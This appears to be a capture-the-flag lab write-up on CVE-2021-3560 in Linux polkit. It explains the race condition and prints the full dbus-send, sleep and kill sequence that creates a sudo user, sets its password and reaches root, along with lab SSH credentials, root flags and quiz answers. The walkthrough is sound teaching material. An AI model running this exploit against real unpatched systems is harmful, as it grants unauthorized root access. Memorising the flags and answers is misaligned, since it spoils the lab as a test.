```
What is the URL of the website you should submit dynamic flags to?
https://flag.muir.land/

Overview

In early 2021 a researcher named Kevin Backhouse discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux polkit utility. Fortunately, different distributions of Linux (and even different versions of the same distributions) use different versions of the software, meaning that only some are vulnerable.

Specifically, the following mainstream distributions, amongst others, were vulnerable:

    Red Hat Enterprise Linux 8
    Fedora 21 (or later)
    Debian Testing ("Bullseye")
    Ubuntu 20.04 LTS ("Focal Fossa")

All should now have released patched versions of their respective polkit packages, however, if you encounter one of these distributions then it may still be vulnerable if it hasn't been updated for a while.

For this room we will be focussing specifically on Ubuntu 20.04. Canonical released a patch for their version of polkit (policykit-1), which has version number 0.105-26ubuntu1.1. The last vulnerable version available in the apt repositories for Focal Fossa is 0.105-26ubuntu1, so, if you see this, you may be in luck!
We can use apt list --installed | grep policykit-1 to check the installed version of polkit:

┌──(kali㉿kali)-[~]
└─$ apt list --installed | grep policykit-1

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

policykit-1-gnome/kali-rolling,now 0.105-7+b1 amd64 [installed]
policykit-1/kali-rolling,now 0.105-33+kali1 amd64 [installed] not vulnerable for ubuntu(patched) -> 0.105-26ubuntu1

What is Polkit?

The logical question to be asking right now is: "What is polkit?"

Polkit is part of the Linux authorisation system. In effect, when you try to perform an action which requires a higher level of privileges, the policy toolkit can be used to determine whether you have the requisite permissions. It is integrated with systemd and is much more configurable than the traditional sudo system. Indeed, it is sometimes referred to as the "sudo of systemd".

When interacting with polkit we can use pkexec, instead of sudo. As an example, attempting to run the useradd command through pkexec in a GUI session results in a pop-up asking for credentials:
pkexec useradd test1234
In a CLI session, we get a text-based prompt instead:
To summarise, the policy toolkit can be thought of as a fine-grained alternative to the simpler sudo system.

How is Polkit vulnerable?

The next logical question is of course: "How can we exploit polkit"?

The short answer is: by manually sending dbus messages to the dbus-daemon (effectively an API to allow different processes the ability to communicate with each other), then killing the request before it has been fully processed, we can trick polkit into authorising the command. If you are not familiar with daemons, they are effectively background services running on Linux. The dbus-daemon is a program running in the background which brokers messages between applications.

For the sake of keeping this room relatively light, we won't go too deep into the specifics behind this (although reading the full article on the vulnerability is highly recommended). Effectively, the vulnerability can be boiled down to these steps:

The dialog box might give the impression that polkit is a graphical system, but it’s actually a background process. The dialog box is known as an authentication agent and it’s really just a mechanism for sending your password to polkit. To illustrate that polkit isn’t just for graphical sessions, try running this command in a terminal:

pkexec reboot

pkexec is a similar command to sudo, which enables you to run a command as root. If you run pkexec in a graphical session, it will pop up a dialog box, but if you run it in a text-mode session such as SSH then it starts its own text-mode authentication agent:

$ pkexec reboot
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/usr/sbin/reboot' as the super user
Authenticating as: Kevin Backhouse,,, (kev)
Password:

Another command that you can use to trigger polkit from the command line is dbus-send. It’s a general purpose tool for sending D-Bus messages that’s mainly used for testing, but it’s usually installed by default on systems that use D-Bus. It can be used to simulate the D-Bus messages that the graphical interface might send. For example, this is the command to create a new user:

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1

If you run that command in a graphical session, an authentication dialog box will pop up, but if you run it in a text-mode session such as SSH, then it fails immediately. That’s because, unlike pkexec, dbus-send does not start its own authentication agent.
    The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user). This message gets given a unique ID by the dbus-daemon.
    The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.
    Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.
    The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.
    Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.
    Thinking that the root user requested the action, polkit allows the request to go through unchallenged.

In short, by destroying the message ID before the dbus-daemon has a chance to give polkit the correct ID, we exploit the poor error-handling in polkit to trick the utility into thinking that the request was made by the all-powerful root user.

If this doesn't make sense now, hopefully it will after you've had a chance to perform the exploit yourself!


In what version of Ubuntu's policykit-1 is CVE-2021-3560 patched?
0.105-26ubuntu1.1


What program can we use to run commands as other users via polkit? pkexec
We've seen the theory, now let's see it in action!

Let's try to add a new user called attacker, with sudo permissions, and a password of Expl01ted. Just read this information for now -- you will have time to try it in the next task!

First, let's look at the dbus messages we'll need to send:

    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker (string:attacker) with a description of "Pentester Account" (string:"Pentester Account") and membership of the sudo group set to true (referenced by theint32:1 flag).

Our second dbus message will set a password for the new account:

    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/UserUSER_ID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask the pentester'

This once again sends a dbus message to the accounts daemon, requesting a password change for the user with an ID which we specify (shown in red), a password hash which we need to generate manually, and a hint ("Ask the pentester")

As this is effectively a race condition, we first need to determine how long our command will take to run. Let's try this with the first dbus message:
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1

┌──(kali㉿kali)-[~]
└─$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
Error org.freedesktop.DBus.Error.ServiceUnknown: The name org.freedesktop.Accounts was not provided by any .service files

real    0.16s
user    0.00s
sys     0.02s
cpu     14%

This takes 0.011 seconds, or 11 milliseconds. This number will be slightly different each time you run the command; however, on the provided machine it should always be around this number.

Note: For the first five minutes or so of deployment the machine is still booting things in the background, so don't be alarmed if the time you get is a lot longer to begin with -- just keep running the command periodically until it gives you a time in a similar region to the results above.

We need to kill the command approximately halfway through execution. Five milliseconds usually works fairly well on the provided machine; however, be aware that this is not an exact thing. You may need to change the sleep time, or run the command several times before it works. That said, once you find a time that works, it should work consistently. If you are struggling to get a working time, putting the command inside a bash for loop and quickly running through a range of times tends to work fairly well.

Let's try this. We need to send the dbus message, then kill it about halfway through:

***dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!***
To explain the above command, we sent the dbus message in a background job (using the ampersand to background the command). We then told it to sleep for 5 milliseconds (sleep 0.005s), then kill the previous process ($!). This successfully created the new user, adding them into the sudo group.
We should note down at this point that the user ID of the new user in this instance is 1000.

Now all we need to do is give the user a password and we should be good to go!

We need a password hash here, so let's generate a Sha512Crypt hash for our chosen password (Expl01ted):

***openssl passwd -6 Expl01ted***

Using openssl, we generate a password of type 6 (SHA512-crypt) and our plaintext password (Expl01ted).

Now let's finish this! 5 milliseconds worked last time, so it should work here too:

┌──(kali㉿kali)-[~]
└─$ openssl passwd -6 Expl01ted
$6$Uo74kYkfXGSHgbCF$wBIJYbiSdtwSpjKTe6eEFT/N3mZszcjHIVXvRQgK6BnXz31sIHmWiV1bGteB/kHoEch.P6zYZ2xylkvYb/l9p1

***
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
*** su attacker /sudo -l/sudo -s
With a hop, su, and a sudo -s, we have root!

***example***
If you would like to SSH into the target machine, the credentials are:

    Username: tryhackme
    Password: TryHackMe123!

┌──(kali㉿kali)-[~]
└─$ ssh tryhackme@10.10.37.102                    
The authenticity of host '10.10.37.102 (10.10.37.102)' can't be established.
ED25519 key fingerprint is SHA256:5lVqFktoDGz1elLLZMRPZobiH6Kof3jiHcBaSeMSXdA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.37.102' (ED25519) to the list of known hosts.
tryhackme@10.10.37.102's password: 
Permission denied, please try again.
tryhackme@10.10.37.102's password: 


         _____           _   _            _    __  __      
        |_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
          | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
          | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
          |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
                   |___/                                   



Last login: Thu Aug  4 16:41:38 2022 from 10.100.1.240
tryhackme@polkit:~$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.013s
user    0m0.000s
sys     0m0.002s
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 1192
tryhackme@polkit:~$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
tryhackme@polkit:~$ openssl passwd -6 Expl01ted
$6$ycV3oq76XQo32ymQ$.uZm8YmnufBOYQB/uqkPHYP59gaJ6AZAENJW0nYzX9ElVwHoEA6zrCVCUD/AdAJmfl42wV2lSBNppqXaRvdjI.
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 1232
tryhackme@polkit:~$ su attacker
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

attacker@polkit:/home/tryhackme$ sudo -l
[sudo] password for attacker: 
Matching Defaults entries for attacker on polkit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User attacker may run the following commands on polkit:
    (ALL : ALL) ALL
attacker@polkit:/home/tryhackme$ sudo -s
root@polkit:/home/tryhackme# id
uid=0(root) gid=0(root) groups=0(root)
root@polkit:/home/tryhackme# whoami
root
root@polkit:/home/tryhackme# cat /root/root.txt
5vXy27+p9X4=-2eNq4vcK9wuphK9n-7nYGpgut2RSn0rllgYpp4E8nKMf8QNGi3ErWHSJ2N6G+lmQtBeqk+g==
root@polkit:/home/tryhackme# 

username: WittyAle
boxcode: polkit
flag: 5vXy27+p9X4=-2eNq4vcK9wuphK9n-7nYGpgut2RSn0rllgYpp4E8nKMf8QNGi3ErWHSJ2N6G+lmQtBeqk+g==
THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}
```

[[Phishing1]]